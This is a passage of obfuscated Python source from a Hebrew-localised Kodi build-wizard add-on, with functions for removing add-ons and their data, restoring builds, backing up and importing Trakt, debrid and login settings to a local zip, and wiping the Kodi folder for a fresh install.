	O0O0OOO0OOO000000 .doModal ()#line:4649
	del O0O0OOO0OOO000000 #line:4650
def removeAddon (O0O000OO0000OO0O0 ,OO0O000O0O0OO00O0 ,over =False ):#line:4652
	if not over ==False :#line:4653
		O0000000OOOOOO0O0 =1 #line:4654
	else :#line:4655
		O0000000OOOOOO0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O000O0O0OO00O0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0O000OO0000OO0O0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4656
	if O0000000OOOOOO0O0 ==1 :#line:4657
		OO00000O0OO00OOO0 =os .path .join (ADDONS ,O0O000OO0000OO0O0 )#line:4658
		wiz .log ("Removing Addon %s"%O0O000OO0000OO0O0 )#line:4659
		wiz .cleanHouse (OO00000O0OO00OOO0 )#line:4660
		xbmc .sleep (1000 )#line:4661
		try :shutil .rmtree (OO00000O0OO00OOO0 )#line:4662
		except Exception as O00OOOO0O0000O00O :wiz .log ("Error removing %s"%O0O000OO0000OO0O0 ,xbmc .LOGNOTICE )#line:4663
		removeAddonData (O0O000OO0000OO0O0 ,OO0O000O0O0OO00O0 ,over )#line:4664
	if over ==False :#line:4665
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO0O000O0O0OO00O0 ))#line:4666
def removeAddonData (OO0OOO00000O0OO00 ,name =None ,over =False ):#line:4668
	if OO0OOO00000O0OO00 =='all':#line:4669
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4670
			wiz .cleanHouse (ADDOND )#line:4671
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4672
	elif OO0OOO00000O0OO00 =='uninstalled':#line:4673
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4674
			OOO0O0O0OO0OOO0OO =0 #line:4675
			for O0O00O0OOO0O00O00 in glob .glob (os .path .join (ADDOND ,'*')):#line:4676
				OOOO0OOO0O00OOOO0 =O0O00O0OOO0O00O00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4677
				if OOOO0OOO0O00OOOO0 in EXCLUDES :pass #line:4678
				elif os .path .exists (os .path .join (ADDONS ,OOOO0OOO0O00OOOO0 )):pass #line:4679
				else :wiz .cleanHouse (O0O00O0OOO0O00O00 );OOO0O0O0OO0OOO0OO +=1 ;wiz .log (O0O00O0OOO0O00O00 );shutil .rmtree (O0O00O0OOO0O00O00 )#line:4680
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOO0O0O0OO0OOO0OO ))#line:4681
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4682
	elif OO0OOO00000O0OO00 =='empty':#line:4683
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4684
			OOO0O0O0OO0OOO0OO =wiz .emptyfolder (ADDOND )#line:4685
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOO0O0O0OO0OOO0OO ))#line:4686
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4687
	else :#line:4688
		OOO00OO0O0O0O00O0 =os .path .join (USERDATA ,'addon_data',OO0OOO00000O0OO00 )#line:4689
		if OO0OOO00000O0OO00 in EXCLUDES :#line:4690
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4691
		elif os .path .exists (OOO00OO0O0O0O00O0 ):#line:4692
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOO00000O0OO00 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4693
				wiz .cleanHouse (OOO00OO0O0O0O00O0 )#line:4694
				try :#line:4695
					shutil .rmtree (OOO00OO0O0O0O00O0 )#line:4696
				except :#line:4697
					wiz .log ("Error deleting: %s"%OOO00OO0O0O0O00O0 )#line:4698
			else :#line:4699
				wiz .log ('Addon data for %s was not removed'%OO0OOO00000O0OO00 )#line:4700
	wiz .refresh ()#line:4701
def restoreit (O00O00O000OOOO00O ):#line:4703
	if O00O00O000OOOO00O =='build':#line:4704
		OOOO00O0000000O00 =freshStart ('restore')#line:4705
		if OOOO00O0000000O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4706
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4707
		wiz .skinToDefault ()#line:4708
	wiz .restoreLocal (O00O00O000OOOO00O )#line:4709
def restoreextit (O00O0OO00O00OO0OO ):#line:4711
	if O00O0OO00O00OO0OO =='build':#line:4712
		OOOOOOOOO0OOOOOOO =freshStart ('restore')#line:4713
		if OOOOOOOOO0OOOOOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4714
	wiz .restoreExternal (O00O0OO00O00OO0OO )#line:4715
def buildInfo (O0O00OOO0O000O000 ):#line:4717
	if wiz .workingURL (SPEEDFILE )==True :#line:4718
		if wiz .checkBuild (O0O00OOO0O000O000 ,'url'):#line:4719
			O0O00OOO0O000O000 ,O0OOOO00O0OOO0OOO ,O0000OO0000OO000O ,O000O00O000O0O0OO ,O00OOOO0O0O0OOO0O ,O00O00OO00O00000O ,O000OO00OOOO000OO ,OO00O00O0OOOOOOOO ,O000O00OOOOOO00OO ,O00000OOO00OOOOOO ,OOO0O0O0000OOOO00 =wiz .checkBuild (O0O00OOO0O000O000 ,'all')#line:4720
			O00000OOO00OOOOOO ='Yes'if O00000OOO00OOOOOO .lower ()=='yes'else 'No'#line:4721
			OOO0000O00O0O000O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OOO0O000O000 )#line:4722
			OOO0000O00O0O000O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOO00O0OOO0OOO )#line:4723
			if not O00O00OO00O00000O =="http://":#line:4724
				OO00O00O00O000000 =wiz .themeCount (O0O00OOO0O000O000 ,False )#line:4725
				OOO0000O00O0O000O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO00O00O00O000000 ))#line:4726
			OOO0000O00O0O000O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOOO0O0O0OOO0O )#line:4727
			OOO0000O00O0O000O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00000OOO00OOOOOO )#line:4728
			OOO0000O00O0O000O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0O0O0000OOOO00 )#line:4729
			wiz .TextBox (ADDONTITLE ,OOO0000O00O0O000O )#line:4730
		else :wiz .log ("Invalid Build Name!")#line:4731
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4732
def buildVideo (O0O00O00OOO0O0O00 ):#line:4734
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4735
	if wiz .workingURL (SPEEDFILE )==True :#line:4736
		O000O0O0O0OO0OOOO =wiz .checkBuild (O0O00O00OOO0O0O00 ,'preview')#line:4737
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0O00O00OOO0O0O00 )#line:4738
		if O000O0O0O0OO0OOOO and not O000O0O0O0OO0OOOO =='http://':playVideo (O000O0O0O0OO0OOOO )#line:4739
		else :wiz .log ("[%s]Unable to find url for video preview"%O0O00O00OOO0O0O00 )#line:4740
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4741
def dependsList (OO0O0O0O00O0000OO ):#line:4743
	OOO000000O00OOO00 =os .path .join (ADDONS ,OO0O0O0O00O0000OO ,'addon.xml')#line:4744
	if os .path .exists (OOO000000O00OOO00 ):#line:4745
		OOO00O0OO0O0OO000 =open (OOO000000O00OOO00 ,mode ='r');OOOO0000OOOOO00OO =OOO00O0OO0O0OO000 .read ();OOO00O0OO0O0OO000 .close ();#line:4746
		OOOO000O00OOOOO0O =wiz .parseDOM (OOOO0000OOOOO00OO ,'import',ret ='addon')#line:4747
		O0O0OOO0OOOO000O0 =[]#line:4748
		for OOOO00OO00OO0O00O in OOOO000O00OOOOO0O :#line:4749
			if not 'xbmc.python'in OOOO00OO00OO0O00O :#line:4750
				O0O0OOO0OOOO000O0 .append (OOOO00OO00OO0O00O )#line:4751
		return O0O0OOO0OOOO000O0 #line:4752
	return []#line:4753
def manageSaveData (OOOOOO000OO0000O0 ):#line:4755
	if OOOOOO000OO0000O0 =='import':#line:4756
		O0OOO00OOO000OO0O =os .path .join (ADDONDATA ,'temp')#line:4757
		if not os .path .exists (O0OOO00OOO000OO0O ):os .makedirs (O0OOO00OOO000OO0O )#line:4758
		O0000O0000000OOOO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4759
		if not O0000O0000000OOOO .endswith ('.zip'):#line:4760
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4761
			return #line:4762
		O0O00O00000O00OOO =os .path .join (MYBUILDS ,'SaveData.zip')#line:4763
		OOO0O0OOO0OOO000O =xbmcvfs .copy (O0000O0000000OOOO ,O0O00O00000O00OOO )#line:4764
		wiz .log ("%s"%str (OOO0O0OOO0OOO000O ))#line:4765
		extract .all (xbmc .translatePath (O0O00O00000O00OOO ),O0OOO00OOO000OO0O )#line:4766
		O00OO000O000OO000 =os .path .join (O0OOO00OOO000OO0O ,'trakt')#line:4767
		O0O0O0OO000OOO0OO =os .path .join (O0OOO00OOO000OO0O ,'login')#line:4768
		OOO000O000O0000O0 =os .path .join (O0OOO00OOO000OO0O ,'debrid')#line:4769
		O000O0000OO00O00O =0 #line:4770
		if os .path .exists (O00OO000O000OO000 ):#line:4771
			O000O0000OO00O00O +=1 #line:4772
			O000000O000OOO00O =os .listdir (O00OO000O000OO000 )#line:4773
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4774
			for O000OOO000OO00O0O in O000000O000OOO00O :#line:4775
				OOO0000OO000O0OOO =os .path .join (traktit .TRAKTFOLD ,O000OOO000OO00O0O )#line:4776
				O0OO0O0OOO000O0OO =os .path .join (O00OO000O000OO000 ,O000OOO000OO00O0O )#line:4777
				if os .path .exists (OOO0000OO000O0OOO ):#line:4778
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000OOO000OO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4779
					else :os .remove (OOO0000OO000O0OOO )#line:4780
				shutil .copy (O0OO0O0OOO000O0OO ,OOO0000OO000O0OOO )#line:4781
			traktit .importlist ('all')#line:4782
			traktit .traktIt ('restore','all')#line:4783
		if os .path .exists (O0O0O0OO000OOO0OO ):#line:4784
			O000O0000OO00O00O +=1 #line:4785
			O000000O000OOO00O =os .listdir (O0O0O0OO000OOO0OO )#line:4786
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4787
			for O000OOO000OO00O0O in O000000O000OOO00O :#line:4788
				OOO0000OO000O0OOO =os .path .join (loginit .LOGINFOLD ,O000OOO000OO00O0O )#line:4789
				O0OO0O0OOO000O0OO =os .path .join (O0O0O0OO000OOO0OO ,O000OOO000OO00O0O )#line:4790
				if os .path .exists (OOO0000OO000O0OOO ):#line:4791
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000OOO000OO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4792
					else :os .remove (OOO0000OO000O0OOO )#line:4793
				shutil .copy (O0OO0O0OOO000O0OO ,OOO0000OO000O0OOO )#line:4794
			loginit .importlist ('all')#line:4795
			loginit .loginIt ('restore','all')#line:4796
		if os .path .exists (OOO000O000O0000O0 ):#line:4797
			O000O0000OO00O00O +=1 #line:4798
			O000000O000OOO00O =os .listdir (OOO000O000O0000O0 )#line:4799
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4800
			for O000OOO000OO00O0O in O000000O000OOO00O :#line:4801
				OOO0000OO000O0OOO =os .path .join (debridit .REALFOLD ,O000OOO000OO00O0O )#line:4802
				O0OO0O0OOO000O0OO =os .path .join (OOO000O000O0000O0 ,O000OOO000OO00O0O )#line:4803
				if os .path .exists (OOO0000OO000O0OOO ):#line:4804
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000OOO000OO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4805
					else :os .remove (OOO0000OO000O0OOO )#line:4806
				shutil .copy (O0OO0O0OOO000O0OO ,OOO0000OO000O0OOO )#line:4807
			debridit .importlist ('all')#line:4808
			debridit .debridIt ('restore','all')#line:4809
		wiz .cleanHouse (O0OOO00OOO000OO0O )#line:4810
		wiz .removeFolder (O0OOO00OOO000OO0O )#line:4811
		os .remove (O0O00O00000O00OOO )#line:4812
		if O000O0000OO00O00O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4813
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4814
	elif OOOOOO000OO0000O0 =='export':#line:4815
		O00O0OO00000OOO00 =xbmc .translatePath (MYBUILDS )#line:4816
		O0O0O00000OOOOOOO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4817
		traktit .traktIt ('update','all')#line:4818
		loginit .loginIt ('update','all')#line:4819
		debridit .debridIt ('update','all')#line:4820
		O0000O0000000OOOO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4821
		O0000O0000000OOOO =xbmc .translatePath (O0000O0000000OOOO )#line:4822
		O0OO0O0000OOO0OO0 =os .path .join (O00O0OO00000OOO00 ,'SaveData.zip')#line:4823
		OOO00000OO000OO00 =zipfile .ZipFile (O0OO0O0000OOO0OO0 ,mode ='w')#line:4824
		for O0OO00O00O00OO0OO in O0O0O00000OOOOOOO :#line:4825
			if os .path .exists (O0OO00O00O00OO0OO ):#line:4826
				O000000O000OOO00O =os .listdir (O0OO00O00O00OO0OO )#line:4827
				for OOO00O0O00O0000OO in O000000O000OOO00O :#line:4828
					OOO00000OO000OO00 .write (os .path .join (O0OO00O00O00OO0OO ,OOO00O0O00O0000OO ),os .path .join (O0OO00O00O00OO0OO ,OOO00O0O00O0000OO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4829
		OOO00000OO000OO00 .close ()#line:4830
		if O0000O0000000OOOO ==O00O0OO00000OOO00 :#line:4831
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0O0000OOO0OO0 ))#line:4832
		else :#line:4833
			try :#line:4834
				xbmcvfs .copy (O0OO0O0000OOO0OO0 ,os .path .join (O0000O0000000OOOO ,'SaveData.zip'))#line:4835
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0000O0000000OOOO ,'SaveData.zip')))#line:4836
			except :#line:4837
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0O0000OOO0OO0 ))#line:4838
def freshStart (install =None ,over =False ):#line:4843
	if USERNAME =='':#line:4844
		ADDON .openSettings ()#line:4845
		sys .exit ()#line:4846
	O0O0OOOO0OOOO0OOO =(SPEEDFILE )#line:4847
	(O0O0OOOO0OOOO0OOO )#line:4848
	O0000O00000000000 =(wiz .workingURL (O0O0OOOO0OOOO0OOO ))#line:4849
	(O0000O00000000000 )#line:4850
	if KEEPTRAKT =='true':#line:4851
		traktit .autoUpdate ('all')#line:4852
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4853
	if KEEPREAL =='true':#line:4854
		debridit .autoUpdate ('all')#line:4855
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4856
	if KEEPLOGIN =='true':#line:4857
		loginit .autoUpdate ('all')#line:4858
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4859
	if over ==True :O000OO0000OOO0OOO =1 #line:4860
	elif install =='restore':O000OO0000OOO0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4861
	elif install :O000OO0000OOO0OOO =1 #line:4862
	else :O000OO0000OOO0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4863
	if O000OO0000OOO0OOO :#line:4864
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4865
			OO00O0OO00OO0OOOO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4866
			skinSwitch .swapSkins (OO00O0OO00OO0OOOO )#line:4869
			O0O00OOOO000000OO =0 #line:4870
			xbmc .sleep (1000 )#line:4871
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00OOOO000000OO <150 :#line:4872
				O0O00OOOO000000OO +=1 #line:4873
				xbmc .sleep (1000 )#line:4874
				wiz .ebi ('SendAction(Select)')#line:4875
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4876
				wiz .ebi ('SendClick(11)')#line:4877
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4878
			xbmc .sleep (1000 )#line:4879
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4880
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4881
			return #line:4882
		wiz .addonUpdates ('set')#line:4883
		OO000O0OOOO0000O0 =os .path .abspath (HOME )#line:4884
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4885
		OOOO00O00OO0OOOO0 =sum ([len (O0OOO0000O00O0O0O )for O0O0000OOOOO0O000 ,OO00OO00O00OO0O0O ,O0OOO0000O00O0O0O in os .walk (OO000O0OOOO0000O0 )]);O0O00O0OO00OO0000 =0 #line:4886
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4887
		EXCLUDES .append ('My_Builds')#line:4888
		EXCLUDES .append ('archive_cache')#line:4889
		EXCLUDES .append ('script.module.requests')#line:4890
		EXCLUDES .append ('myfav.anon')#line:4891
		if KEEPREPOS =='true':#line:4892
			OOOOO0O0000OO000O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4893
			for O0OO0OOO0000O0O00 in OOOOO0O0000OO000O :#line:4894
				OOOOOOOO0O00OO0OO =os .path .split (O0OO0OOO0000O0O00 [:-1 ])[1 ]#line:4895
				if not OOOOOOOO0O00OO0OO ==EXCLUDES :#line:4896
					EXCLUDES .append (OOOOOOOO0O00OO0OO )#line:4897
		if KEEPSUPER =='true':#line:4898
			EXCLUDES .append ('plugin.program.super.favourites')#line:4899
		if KEEPMOVIELIST =='true':#line:4900
			EXCLUDES .append ('plugin.video.metalliq')#line:4901
		if KEEPMOVIELIST =='true':#line:4902
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4903
		if KEEPADDONS =='true':#line:4904
			EXCLUDES .append ('addons')#line:4905
		if KEEPTELEMEDIA =='true':#line:4906
			EXCLUDES .append ('plugin.video.telemedia')#line:4907
		EXCLUDES .append ('plugin.video.elementum')#line:4912
		EXCLUDES .append ('script.elementum.burst')#line:4913
		EXCLUDES .append ('script.elementum.burst-master')#line:4914
		EXCLUDES .append ('plugin.video.quasar')#line:4915
		EXCLUDES .append ('script.quasar.burst')#line:4916
		EXCLUDES .append ('skin.estuary')#line:4917
		if KEEPWHITELIST =='true':#line:4920
			OOO000O0OO00OOO0O =''#line:4921
			OO00OOO0O00000O0O =wiz .whiteList ('read')#line:4922
			if len (OO00OOO0O00000O0O )>0 :#line:4923
				for O0OO0OOO0000O0O00 in OO00OOO0O00000O0O :#line:4924
					try :OOOOO00OO0OO00000 ,OO0000O00OO00OO0O ,O00O0O00O0000OOOO =O0OO0OOO0000O0O00 #line:4925
					except :pass #line:4926
					if O00O0O00O0000OOOO .startswith ('pvr'):OOO000O0OO00OOO0O =OO0000O00OO00OO0O #line:4927
					OO0O0O0O00O00OO00 =dependsList (O00O0O00O0000OOOO )#line:4928
					for OO00OOOO0O00OO000 in OO0O0O0O00O00OO00 :#line:4929
						if not OO00OOOO0O00OO000 in EXCLUDES :#line:4930
							EXCLUDES .append (OO00OOOO0O00OO000 )#line:4931
						O000O00000O00000O =dependsList (OO00OOOO0O00OO000 )#line:4932
						for O00O0O000000OO000 in O000O00000O00000O :#line:4933
							if not O00O0O000000OO000 in EXCLUDES :#line:4934
								EXCLUDES .append (O00O0O000000OO000 )#line:4935
					if not O00O0O00O0000OOOO in EXCLUDES :#line:4936
						EXCLUDES .append (O00O0O00O0000OOOO )#line:4937
				if not OOO000O0OO00OOO0O =='':wiz .setS ('pvrclient',O00O0O00O0000OOOO )#line:4938
		if wiz .getS ('pvrclient')=='':#line:4939
			for O0OO0OOO0000O0O00 in EXCLUDES :#line:4940
				if O0OO0OOO0000O0O00 .startswith ('pvr'):#line:4941
					wiz .setS ('pvrclient',O0OO0OOO0000O0O00 )#line:4942
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4943
		OOOOOO0OOO0O0O0O0 =wiz .latestDB ('Addons')#line:4944
		for O00OOOO000O000000 ,O0O00O00O0O000OOO ,OO0OO0OO000O0O000 in os .walk (OO000O0OOOO0000O0 ,topdown =True ):#line:4945
			O0O00O00O0O000OOO [:]=[OO0000O0OO00O0O0O for OO0000O0OO00O0O0O in O0O00O00O0O000OOO if OO0000O0OO00O0O0O not in EXCLUDES ]#line:4946
			for OOOOO00OO0OO00000 in OO0OO0OO000O0O000 :#line:4947
				O0O00O0OO00OO0000 +=1 #line:4948
				O00O0O00O0000OOOO =O00OOOO000O000000 .replace ('/','\\').split ('\\')#line:4949
				O0O00OOOO000000OO =len (O00O0O00O0000OOOO )-1 #line:4951
				if O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4952
				elif OOOOO00OO0OO00000 =='MyVideos99.db'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4953
				elif OOOOO00OO0OO00000 =='MyVideos107.db'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4954
				elif OOOOO00OO0OO00000 =='MyVideos116.db'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4955
				elif OOOOO00OO0OO00000 =='MyVideos99.db'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4956
				elif OOOOO00OO0OO00000 =='MyVideos107.db'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4957
				elif OOOOO00OO0OO00000 =='MyVideos116.db'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4958
				elif O00O0O00O0000OOOO [O0O00OOOO000000OO -2 ]=='userdata'and O00O0O00O0000OOOO [O0O00OOOO000000OO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O00O0O00O0000OOOO [O0O00OOOO000000OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00OOOO000O000000 ,OOOOO00OO0OO00000 ),xbmc .LOGNOTICE )#line:4959
